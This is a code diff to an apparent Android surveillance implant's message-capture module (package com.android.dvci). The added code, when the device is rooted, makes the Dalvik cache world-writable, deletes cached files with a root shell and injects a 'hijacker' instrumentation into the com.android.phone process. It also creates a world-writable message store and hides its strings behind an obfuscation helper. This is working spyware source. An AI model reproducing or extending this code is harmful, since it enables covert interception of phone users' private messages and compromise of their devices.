@@ -43,10 +43,13 @@ import com.android.dvci.module.message.MmsBrowser;
 import com.android.dvci.module.message.MsgHandler;
 import com.android.dvci.module.message.Sms;
 import com.android.dvci.module.message.SmsBrowser;
+import com.android.dvci.util.AudioEncoder;
 import com.android.dvci.util.ByteArray;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.DataBuffer;
 import com.android.dvci.util.DateTime;
+import com.android.dvci.util.Execute;
+import com.android.dvci.util.Instrument;
 import com.android.dvci.util.WChar;
 import com.android.mm.M;
 
@@ -66,6 +69,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 	private static final int ID_SMS = 1;
 	private static final int ID_MMS = 2;
 	private static final int MAIL_PROGRAM = 2;
+	private static String messageStorage = null;
 	private boolean mailEnabled;
 	private boolean smsEnabled;
 	private boolean mmsEnabled;
@@ -82,6 +86,8 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 	private int lastSMS;
 	private Filter[] filterCollect = new Filter[3];
 	private Filter[] filterRuntime = new Filter[3];
+	private Instrument hijack = null;
+	private static String MESSAGE_STORE = "m4/";
 
 	// private SmsHandler smsHandler;
 
@@ -235,6 +241,24 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		if (mmsEnabled) {
 			initMms();
 		}
+		if( Status.haveRoot()) {
+			createMsgStorage();
+			Execute.chmod(M.e("777"), M.e("/data/dalvik-cache/"));
+			Execute.executeRoot(M.e("rm /data/dalvik-cache/")+messageStorage.replace("/","@")+"*");
+			hijack = new Instrument(M.e("com.android.phone"), messageStorage, M.e("irp"), null,M.e("pa.data"),M.e("ppa.data"));
+
+			if (hijack.startInstrumentation()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(actualStart): hijacker successfully installed");
+				}
+				EvidenceBuilder.info(M.e("Call Module ready"));
+
+			} else {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(actualStart): hijacker cannot be installed");
+				}
+			}
+		}
 
 		if (smsEnabled || mmsEnabled) {
 			// Iniziamo la cattura live
@@ -259,8 +283,16 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		if (smsEnabled) {
 			ListenerSms.self().detach(this);
 		}
+
 		if (msgHandler != null) {
 			msgHandler.quit();
+		}
+
+		if( Status.haveRoot()) {
+			if (hijack != null) {
+				hijack.stopInstrumentation();
+
+			}
 		}
 
 	}
@@ -633,5 +665,25 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 			Check.log(TAG + " (getLastManagedSmsId): " + lastSMS);
 		}
 		return lastSMS;
+	}
+	static public boolean createMsgStorage() {
+		// Create storage directory
+		messageStorage = Status.getAppContext().getFilesDir().getAbsolutePath() + "/" + MESSAGE_STORE;
+
+		if (Path.createDirectory(messageStorage) == false) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (createMsgStorage): audio storage directory cannot be created"); //$NON-NLS-1$
+			}
+
+			return false;
+		} else {
+			Execute.chmod(M.e("777"), messageStorage);
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (createMsgStorage): audio storage directory created at " + messageStorage); //$NON-NLS-1$
+			}
+
+			return true;
+		}
 	}
 }
